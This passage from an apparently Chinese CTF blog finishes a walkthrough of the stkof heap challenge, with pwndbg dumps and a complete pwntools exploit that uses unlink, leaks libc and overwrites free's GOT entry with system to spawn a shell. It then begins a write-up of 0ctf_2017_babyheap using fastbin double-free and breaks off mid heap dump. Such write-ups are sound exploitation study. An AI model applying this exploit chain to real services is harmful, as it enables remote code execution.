<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x602130</span><br><span class="line">0x602130:	0x0000000000000000	0x6161616161616161</span><br><span class="line">0x602140:	0x6161616161616161	0x0000000000602018</span><br><span class="line">0x602150:	0x0000000000602020	0x0000000000000000</span><br><span class="line">0x602160:	0x00000000020f8530	0x0000000000000000</span><br><span class="line">0x602170:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x0000000000602018</span><br><span class="line">0x602018 &lt;free@got.plt&gt;:	0x00007fbcdd619540	0x00007fbcdd6046a0</span><br><span class="line">0x602028 &lt;fread@got.plt&gt;:	0x00007fbcdd6031b0	0x0000000000400786</span><br></pre></td></tr></table></figure>
<h4 id="5-获取打印功能，泄露地址"><a href="#5-获取打印功能，泄露地址" class="headerlink" title="5.获取打印功能，泄露地址"></a>5.获取打印功能，泄露地址</h4><blockquote>
<p>由于前面已经修改chunk1的指针为got表指针，所以，直接fill chunk1的内容为puts_plt，那么free()时就是执行puts函数，从而泄露地址。</p>
<p>由于chunk2的指针已经为puts_got，所以free(2)就是puts(puts函数的got表)</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x0000000000602018</span><br><span class="line">0x602018 &lt;free@got.plt&gt;:	0x0000000000400760	0x00007fbcdd6046a0</span><br><span class="line">0x602028 &lt;fread@got.plt&gt;:	0x00007fbcdd6031b0	0x0000000000400786</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x&#x2F;30gx 0x0000000000400760</span><br><span class="line">0x400760 &lt;puts@plt&gt;:	0x0168002018ba25ff	0xffffffd0e9000000</span><br></pre></td></tr></table></figure>
<blockquote>
<p>泄露成功，可以计算libc基址、system函数地址</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received 0x7 bytes:</span><br><span class="line">    00000000  a0 46 60 dd  bc 7f 0a                               │·F&#96;·│···│</span><br><span class="line">    00000007</span><br><span class="line">    </span><br><span class="line">pwndbg&gt; x&#x2F;30gx puts</span><br><span class="line">0x7fbcdd6046a0 &lt;_IO_puts&gt;:</span><br></pre></td></tr></table></figure>
<h4 id="6-free-gt-system，块内容“-bin-sh”"><a href="#6-free-gt-system，块内容“-bin-sh”" class="headerlink" title="6.free-&gt;system，块内容“/bin/sh”"></a>6.free-&gt;system，块内容“/bin/sh”</h4><blockquote>
<p>同5，再次fill chunk1内容为system的地址，然后执行free函数就是执行system函数。</p>
<p>对未使用的chunk4填入“/bin/sh”内容，free(4)即可执行system(“/bin/sh”)</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x0000000000602018</span><br><span class="line">0x602018 &lt;free@got.plt&gt;:	0x00007fbcdd5da3a0	0x00007fbcdd6046a0</span><br><span class="line">0x602028 &lt;fread@got.plt&gt;:	0x00007fbcdd6031b0	0x0000000000400786</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x&#x2F;30gx 0x00007fbcdd5da3a0</span><br><span class="line">0x7fbcdd5da3a0 &lt;__libc_system&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x20f8450</span><br><span class="line">0x20f8450:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0x20f8460:	0x0000000000000000	0x00000000000000c1</span><br><span class="line">0x20f8470:	0x00007fbcdd959b78	0x00007fbcdd959b78</span><br><span class="line">0x20f8480:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x20f8490:	0x0000000000000030	0x0000000000000090</span><br><span class="line">0x20f84a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f84b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f84c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f84d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f84e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f84f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8500:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8510:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8520:	0x00000000000000c0	0x0000000000000030</span><br><span class="line">0x20f8530:	0x0000000000000000	0x0000000000000000#chunk4</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x20f8450</span><br><span class="line">0x20f8450:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0x20f8460:	0x0000000000000000	0x00000000000000c1</span><br><span class="line">0x20f8470:	0x00007fbcdd959b78	0x00007fbcdd959b78</span><br><span class="line">0x20f8480:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x20f8490:	0x0000000000000030	0x0000000000000090</span><br><span class="line">0x20f84a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f84b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f84c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f84d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f84e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f84f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8500:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8510:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8520:	0x00000000000000c0	0x0000000000000030</span><br><span class="line">0x20f8530:	0x0068732f6e69622f	0x0000000000000000#chunk4填入“&#x2F;bin&#x2F;sh”</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x&#x2F;10s 0x20f8530</span><br><span class="line">0x20f8530:	&quot;&#x2F;bin&#x2F;sh&quot;</span><br></pre></td></tr></table></figure>
<h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./stkof'</span>)</span><br><span class="line">p=remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">28999</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./stkof"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc-2.23.so"</span>)</span><br><span class="line"></span><br><span class="line">free_got = elf.got[<span class="string">'free'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(size)</span>:</span></span><br><span class="line">    p.sendline(str(<span class="number">1</span>))</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">"OK"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    p.sendline(str(<span class="number">2</span>))</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.sendline(str(len(content)))</span><br><span class="line">    p.sendline(content)</span><br><span class="line">    p.recvuntil(<span class="string">"OK"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendline(str(<span class="number">3</span>))</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x30</span>)</span><br><span class="line">alloc(<span class="number">0x30</span>)</span><br><span class="line">alloc(<span class="number">0x80</span>)</span><br><span class="line">alloc(<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">target = <span class="number">0x602140</span> + <span class="number">0x10</span></span><br><span class="line">fd = target - <span class="number">0x18</span></span><br><span class="line">bk = target - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x30</span>)</span><br><span class="line">payload += p64(fd) + p64(bk)</span><br><span class="line">payload += <span class="string">"a"</span>*<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">payload += p64(<span class="number">0x30</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">fill(<span class="number">2</span>,payload)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">0x10</span></span><br><span class="line">payload += p64(free_got) + p64(puts_got)</span><br><span class="line">fill(<span class="number">2</span>,payload)</span><br><span class="line"></span><br><span class="line">payload = p64(puts_plt)</span><br><span class="line">fill(<span class="number">1</span>,payload)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:]+<span class="string">'\x00\x00'</span>)</span><br><span class="line">log.success(hex(puts_addr))</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">binsh = libc_base + libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line"></span><br><span class="line">log.success(hex(libc_base))</span><br><span class="line">log.success(hex(system))</span><br><span class="line">log.success(hex(binsh))</span><br><span class="line"></span><br><span class="line">payload = p64(system)</span><br><span class="line">fill(<span class="number">1</span>,payload)</span><br><span class="line"></span><br><span class="line">fill(<span class="number">4</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这道题其实是第二次做了，还比较顺。思路比第一次更清晰了（<a href="https://warm-winter.github.io/2020/11/11/%C2%96ctf-wiki%E7%9A%84%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/#2014-hitcon-stkof" target="_blank" rel="noopener">第一次分析</a>）。</p>
<p>unlink主要适用于存在堆溢出和全局变量的情况。</p>
</blockquote>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/04/19/23-55/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/shuwen.jpg">
      <meta itemprop="name" content="Shuwen">
      <meta itemprop="description" content="做有意思的事，有意思地做事">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Shuwen's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/04/19/23-55/" class="post-title-link" itemprop="url">0ctf_2017_babyheap详解</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-04-19 23:55:13" itemprop="dateCreated datePublished" datetime="2021-04-19T23:55:13+08:00">2021-04-19</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-04-20 10:45:02" itemprop="dateModified" datetime="2021-04-20T10:45:02+08:00">2021-04-20</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/buu/" itemprop="url" rel="index"><span itemprop="name">buu</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <blockquote>
<p>本文主要列出0ctf_2017_babyheap的详细过程</p>
<p>主要参考：<a href="https://bbs.pediy.com/thread-223461.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-223461.htm</a></p>
</blockquote>
<h3 id="程序流程"><a href="#程序流程" class="headerlink" title="程序流程"></a>程序流程</h3><ol>
<li>allocate：申请size大小的块</li>
<li>fill：对idx的块，设置size，并填入content</li>
<li>free：释放idx的块</li>
<li>dump：打印idx的块内容</li>
</ol>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>fill中的size可以重新设置，故可以造成堆溢出。</p>
<p>方法：fastbin attack</p>
<ol>
<li><p>double free泄露libc</p>
<p>【small/large chunk释放，fd和bk指向main_arena】</p>
</li>
<li><p>fastbin attack写malloc_hook为one_gadget</p>
</li>
</ol>
<h3 id="详细过程"><a href="#详细过程" class="headerlink" title="详细过程"></a>详细过程</h3><h4 id="1-保护"><a href="#1-保护" class="headerlink" title="1.保护"></a>1.保护</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">winter@ubuntu:~&#x2F;buu$ checksec 0ctf_2017_babyheap </span><br><span class="line">[*] &#39;&#x2F;home&#x2F;winter&#x2F;buu&#x2F;0ctf_2017_babyheap&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<h4 id="2-申请初始块"><a href="#2-申请初始块" class="headerlink" title="2.申请初始块"></a>2.申请初始块</h4><blockquote>
<p>四个0x10、一个0x80</p>
<p>第0个块作用：方便修改第1、2块</p>
<p>第3个块作用：方便修改0x80的块</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6020</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6040</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6060</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6080</span><br><span class="line">Size: 0x91</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6110</span><br><span class="line">Size: 0x20ef1</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;50gx 0x5614ee1f6000</span><br><span class="line">0x5614ee1f6000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6020:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6040:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6060:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6080:	0x0000000000000000	0x0000000000000091</span><br><span class="line">0x5614ee1f6090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6100:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6110:	0x0000000000000000	0x0000000000020ef1</span><br><span class="line">0x5614ee1f6120:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6130:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6140:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6150:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6160:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6170:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6180:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<h4 id="3-释放1、2块"><a href="#3-释放1、2块" class="headerlink" title="3.释放1、2块"></a>3.释放1、2块</h4><blockquote>
<p>为double free做准备，其中 块2指向块1</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">#1</span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6020</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0x00</span><br><span class="line"></span><br><span class="line">#2</span><br><span class="line">#指向块1，先进后出</span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6040</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0x5614ee1f6020</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6060</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6080</span><br><span class="line">Size: 0x91</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6110</span><br><span class="line">Size: 0x20ef1</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;50gx 0x5614ee1f6000</span><br><span class="line">0x5614ee1f6000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6020:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6040:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6050:	0x00005614ee1f6020	0x0000000000000000</span><br><span class="line">0x5614ee1f6060:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6080:	0x0000000000000000	0x0000000000000091</span><br><span class="line">0x5614ee1f6090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6100:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6110:	0x0000000000000000	0x0000000000020ef1</span><br><span class="line">0x5614ee1f6120:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6130:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6140:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6150:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6160:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6170:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6180:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<h4 id="4-令释放块2指向块4"><a href="#4-令释放块2指向块4" class="headerlink" title="4.令释放块2指向块4"></a>4.令释放块2指向块4</h4><blockquote>
<p>通过漏洞fill堆溢出，修改块2里指向块1的低地址，修改为0x80，即可使得块2指向块4</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;50gx 0x5614ee1f6000</span><br><span class="line">0x5614ee1f6000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6020:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6040:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6050:	0x00005614ee1f6080	0x0000000000000000</span><br><span class="line">0x5614ee1f6060:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6080:	0x0000000000000000	0x0000000000000091</span><br><span class="line">0x5614ee1f6090:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<h4 id="5-为绕过检测，修改块4：0x80-gt-0x10"><a href="#5-为绕过检测，修改块4：0x80-gt-0x10" class="headerlink" title="5.为绕过检测，修改块4：0x80-&gt;0x10"></a>5.为绕过检测，修改块4：0x80-&gt;0x10</h4><blockquote>
<p>溢出实现</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;50gx 0x5614ee1f6000</span><br><span class="line">0x5614ee1f6000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6020:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6040:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6050:	0x00005614ee1f6080	0x0000000000000000</span><br><span class="line">0x5614ee1f6060:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6080:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60e0:	0x0000000000000000	